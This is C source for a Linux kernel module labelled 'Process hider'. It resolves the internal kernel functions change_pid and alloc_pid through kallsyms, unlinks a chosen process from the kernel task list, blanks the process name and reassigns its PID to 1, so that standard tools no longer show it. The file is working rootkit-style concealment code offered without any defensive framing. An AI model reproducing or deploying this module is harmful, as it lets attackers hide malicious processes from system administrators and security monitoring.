#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/list.h>
#include <linux/proc_fs.h>
#include <linux/pid.h>
#include <linux/pid_namespace.h>
#include <linux/kallsyms.h> 

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Jean 'iansus' Marsault");
MODULE_DESCRIPTION("Process hider");
MODULE_VERSION("1.0");

// From https://github.com/gravit0/changepid/blob/master/module/main.c
static asmlinkage void (*change_pidR)(struct task_struct *task, enum pid_type type, struct pid *pid);
static asmlinkage struct pid* (*alloc_pidR)(struct pid_namespace *ns);

static void* find_sym( const char *sym ) {  // find address kernel symbol sym 
	static unsigned long faddr = 0;          // static !!! 
	// ----------- nested functions are a GCC extension --------- 
	int symb_fn( void* data, const char* sym, struct module* mod, unsigned long addr ) { 
		if( 0 == strcmp( (char*)data, sym ) ) { 
			faddr = addr; 
			return 1; 
		} 
		else return 0; 
	}; 
	// -------------------------------------------------------- 
	kallsyms_on_each_symbol( symb_fn, (void*)sym ); 
	return (void*)faddr; 
}


// LKM Arguments
static int target_pid = 0;
module_param(target_pid, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
MODULE_PARM_DESC(target_pid, "Target process PID");

static int verb = 0;
module_param(verb, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
MODULE_PARM_DESC(verb, "Set to non-0 to make the module verbose");


// LKM Init func
static int __init hideproc_init(void) {

	struct list_head* pos = NULL;
	struct task_struct *task = NULL, *elected_task = NULL, *task_prev = NULL, *task_next = NULL;
	struct pid* newpid = NULL;
	char new_comm[16] = {0};

	change_pidR = find_sym("change_pid");
	alloc_pidR = find_sym("alloc_pid");

	if (verb) printk(KERN_INFO "Target PID is %d", target_pid);
	list_for_each(pos, &current->tasks) {

		task = list_entry(pos, struct task_struct, tasks); 
		if(task->pid == target_pid) {
			elected_task = task;
		}
	}

	if(elected_task!=NULL) {

		if (verb) printk(KERN_INFO "Process id is %d", elected_task->pid);

		task_next = list_entry(elected_task->tasks.next, struct task_struct, tasks);
		task_prev = list_entry(elected_task->tasks.prev, struct task_struct, tasks);
		if(verb) {
			printk(KERN_INFO "Next process is %s", task_next->comm);
			printk(KERN_INFO "Prev process is %s", task_prev->comm);
		}

		memcpy(elected_task->comm, new_comm, 16);

		task_prev->tasks.next = elected_task->tasks.next;
		task_next->tasks.prev = elected_task->tasks.prev;

		elected_task->tasks.next = &(elected_task->tasks);
		elected_task->tasks.prev = &(elected_task->tasks);

		newpid = alloc_pidR(task_active_pid_ns(elected_task));
		newpid->numbers[0].nr = 1;
		change_pidR(elected_task, PIDTYPE_PID, newpid);
		elected_task->pid = 1;
	}

	return 0;
}

// LKM Exit func
static void __exit hideproc_exit(void) {

	if (verb) printk(KERN_INFO "Goodbye, World!\n");
}

// Register init & exit funcs
module_init(hideproc_init);
module_exit(hideproc_exit);
